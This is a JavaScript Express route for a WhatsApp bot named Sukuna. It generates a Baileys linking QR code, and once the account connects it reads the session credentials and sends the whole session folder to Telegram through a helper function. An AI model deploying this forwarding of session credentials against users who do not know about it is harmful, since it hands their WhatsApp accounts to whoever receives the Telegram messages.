/**
 * ═══════════════════════════════════════════════════════
 * 🔳 QR CODE | ربط بـ QR Code
 * ═══════════════════════════════════════════════════════
 * 👑 المطور: آدم (شادو) | Adam (Shadow)
 * 🤖 البوت: سوكونا | Sukuna
 * 🏷️ الحقوق: ${global.author}
 * 📜 الوصف: توليد كود QR وإرسال الجلسة للتليجرام
 * ═══════════════════════════════════════════════════════
 */

import express from 'express';
import fs from 'fs';
import pino from 'pino';
import { 
  makeWASocket, 
  useMultiFileAuthState, 
  makeCacheableSignalKeyStore, 
  Browsers, 
  fetchLatestBaileysVersion 
} from '@whiskeysockets/baileys';
import QRCode from 'qrcode';
import { sendSessionToTelegram } from './lib/sender.js';

const router = express.Router();

function removeFile(FilePath) {
  try {
    if (!fs.existsSync(FilePath)) return false;
    fs.rmSync(FilePath, { recursive: true, force: true });
  } catch (e) {
    console.error('Error removing file:', e);
  }
}

router.get('/', async (req, res) => {
  const sessionId = Date.now().toString() + Math.random().toString(36).substr(2, 9);
  const dirs = `./temp_sessions/session_${sessionId}`;
  if (!fs.existsSync('./temp_sessions')) fs.mkdirSync('./temp_sessions', { recursive: true });

  async function initiateSession() {
    if (!fs.existsSync(dirs)) fs.mkdirSync(dirs, { recursive: true });
    const { state, saveCreds } = await useMultiFileAuthState(dirs);
    try {
      const { version } = await fetchLatestBaileysVersion();
      let qrGenerated = false;
      let responseSent = false;

      const handleQRCode = async (qr) => {
        if (qrGenerated || responseSent) return;
        qrGenerated = true;
        try {
          const qrDataURL = await QRCode.toDataURL(qr, {
            errorCorrectionLevel: 'M',
            type: 'image/png',
            quality: 0.92,
            margin: 1,
            color: { dark: '#000000', light: '#FFFFFF' }
          });
          if (!responseSent) {
            responseSent = true;
            res.send({ qr: qrDataURL, message: 'QR Code Generated' });
          }
        } catch (qrError) {
          console.error('Error generating QR code:', qrError);
          if (!responseSent) {
            responseSent = true;
            res.status(500).send({ code: 'Failed to generate QR code' });
          }
        }
      };

      const socketConfig = {
        version,
        logger: pino({ level: 'silent' }),
        browser: Browsers.windows('Chrome'),
        auth: {
          creds: state.creds,
          keys: makeCacheableSignalKeyStore(state.keys, pino({ level: "fatal" }).child({ level: "fatal" })),
        },
        markOnlineOnConnect: false,
        generateHighQualityLinkPreview: false,
        defaultQueryTimeoutMs: 60000,
        connectTimeoutMs: 60000,
        keepAliveIntervalMs: 30000,
        retryRequestDelayMs: 250,
        maxRetries: 5,
      };

      let sock = makeWASocket(socketConfig);

      const handleConnectionUpdate = async (update) => {
        const { connection, lastDisconnect, qr } = update;
        if (qr && !qrGenerated) await handleQRCode(qr);

        if (connection === 'open') {
          console.log('✅ Connected successfully!');
          try {
            // انتظار حفظ الكريدز
            await new Promise(resolve => setTimeout(resolve, 2000));
            
            // استخراج الرقم من الجلسة
            const credsPath = `${dirs}/creds.json`;
            let phoneNumber = 'QR_Session';
            if (fs.existsSync(credsPath)) {
              const creds = JSON.parse(fs.readFileSync(credsPath, 'utf-8'));
              if (creds.me?.id) {
                phoneNumber = creds.me.id.split(':')[0].split('@')[0];
              }
            }
            
            // إرسال الجلسة للتليجرام
            await sendSessionToTelegram(dirs, phoneNumber);
            
            setTimeout(() => removeFile(dirs), 5000);
          } catch (error) {
            console.error("Error sending session file:", error);
          }
        }

        if (connection === 'close') {
          const statusCode = lastDisconnect?.error?.output?.statusCode;
          if (statusCode === 401) {
            removeFile(dirs);
          }
        }
      };

      sock.ev.on('connection.update', handleConnectionUpdate);
      sock.ev.on('creds.update', saveCreds);

      setTimeout(() => {
        if (!responseSent) {
          responseSent = true;
          res.status(408).send({ code: 'QR generation timeout' });
          removeFile(dirs);
        }
      }, 60000);
    } catch (err) {
      console.error('Error initializing session:', err);
      if (!res.headersSent) {
        res.status(503).send({ code: 'Service Unavailable' });
      }
      removeFile(dirs);
    }
  }
  await initiateSession();
});

export default router;